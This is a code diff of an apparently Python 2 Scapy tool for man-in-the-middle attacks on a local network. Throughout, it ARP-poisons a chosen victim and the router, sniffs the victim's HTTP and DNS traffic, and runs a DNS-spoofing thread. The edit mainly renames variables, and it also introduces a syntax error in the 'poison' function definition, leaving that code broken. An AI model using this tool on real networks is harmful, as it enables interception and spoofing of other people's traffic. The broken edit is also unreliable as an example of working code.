@@ -70,7 +70,7 @@ dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff')/
 			chr(DHCPRevOptions["name_server"][0]),
 			), "end"]))
 
-ans, unans = srp(dhcp, timeout=5, retry=1)
+ans, unans = srp(dhcp, timeout=6, retry=1)
 if ans:
 	for s,r in ans:
 		DHCPopt = r[0][DHCP].options
@@ -90,13 +90,13 @@ else:
 	local_domain = 'None'
 
 if args.ipaddress:
-	VICTIMIP = args.ipaddress
+	victimIP = args.ipaddress
 else:
 	ans,unans = arping(IPprefix+'*')
 	for s,r in ans:
 		ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
 		print ips
-	VICTIMIP = raw_input('\nType victim\'s IP: ')
+	victimIP = raw_input('\nType victim\'s IP: ')
 	print ''
 
 print "[+] Active interface: " + interface
@@ -106,7 +106,7 @@ print "[+] DHCP server: " + DHCPsrvr
 print "[+] DNS server: " + DNSsrvr
 print "[+] Local domain: " + local_domain
 print "[+] Router IP: " + routerIP
-print "[+] Client IP: " + VICTIMIP
+print "[+] Client IP: " + victimIP
 
 def originalMAC(ip):
 	# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
@@ -114,18 +114,18 @@ def originalMAC(ip):
 	for s,r in ans:
 		return r.sprintf("%Ether.src%")
 
-def poison(routerIP, VICTIMIP):
-	send(ARP(op=2, pdst=VICTIMIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff"))
-	send(ARP(op=2, pdst=routerIP, psrc=VICTIMIP, hwdst="ff:ff:ff:ff:ff:ff"))
+def poisonrouterIP, victimIP):
+	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff"))
+	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff"))
 
-def restore(routerIP, VICTIMIP, routerMAC, VICTIMMAC):
-	send(ARP(op=2, pdst=routerIP, psrc=VICTIMIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=VICTIMMAC), count=3)
-	send(ARP(op=2, pdst=VICTIMIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
+def restore(routerIP, victimIP, routerMAC, victimMAC):
+	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
+	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
 
 def URL(pkt):
 	global host, get, post, url
 
-	if pkt.haslayer(Raw) and pkt[Ether].src == VICTIMMAC:
+	if pkt.haslayer(Raw) and pkt[Ether].src == victimMAC:
 		pkt = repr(pkt[Raw].load)
 		try:
 			headers, body = pkt.split(r"\r\n\r\n")
@@ -250,16 +250,16 @@ class urlspy(threading.Thread):
 	def run(self):
 #		This is in case you need to test the program without an actual victim
 #		sniff(store=0, filter='port 80', prn=URL, iface=interface)
-		sniff(store=0, filter='port 80 and host %s' % VICTIMIP, prn=URL, iface=interface)
+		sniff(store=0, filter='port 80 and host %s' % victimIP, prn=URL, iface=interface)
 
 class dnsspy(threading.Thread):
 	def run(self):
-		sniff(store=0, filter='port 53 and host %s' % VICTIMIP, prn=DNSreq, iface=interface)
+		sniff(store=0, filter='port 53 and host %s' % victimIP, prn=DNSreq, iface=interface)
 
 class dnsspoof(threading.Thread):
 	def run(self):
 		while 1:
-			a=sniff(filter='port 53 or port 80 and host %s' % VICTIMIP, count=1, promisc=1)
+			a=sniff(filter='port 53 or port 80 and host %s' % victimIP, count=1, promisc=1)
 			DNSpkt = a[0]
 			if not DNSpkt.haslayer(DNSQR):
 				continue
@@ -280,8 +280,8 @@ class driftnet(threading.Thread):
 try:
 	routerMAC = originalMAC(routerIP)
 	print "[+] Router MAC: " + routerMAC
-	VICTIMMAC = originalMAC(VICTIMIP)
-	print "[+] Victim MAC: " + VICTIMMAC + "\n"
+	victimMAC = originalMAC(victimIP)
+	print "[+] Victim MAC: " + victimMAC + "\n"
 except:
 	sys.exit("Could not get MAC addresses")
 
@@ -323,8 +323,8 @@ def main():
 
 	def signal_handler(signal, frame):
 		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
-		restore(routerIP, VICTIMIP, routerMAC, VICTIMMAC)
-		restore(routerIP, VICTIMIP, routerMAC, VICTIMMAC)
+		restore(routerIP, victimIP, routerMAC, victimMAC)
+		restore(routerIP, victimIP, routerMAC, victimMAC)
 		bash('echo 0 > /proc/sys/net/ipv4/ip_forward')
 		bash('iptables -t nat -F')
 		bash('iptables -F')
@@ -336,9 +336,9 @@ def main():
 
 	while 1:
 
-		poison(routerIP, VICTIMIP)
+		poison(routerIP, victimIP)
 		if not DNSsrvr == routerIP:
-			poison(DNSsrvr, VICTIMIP)
+			poison(DNSsrvr, victimIP)
 		time.sleep(1.5)
 
 
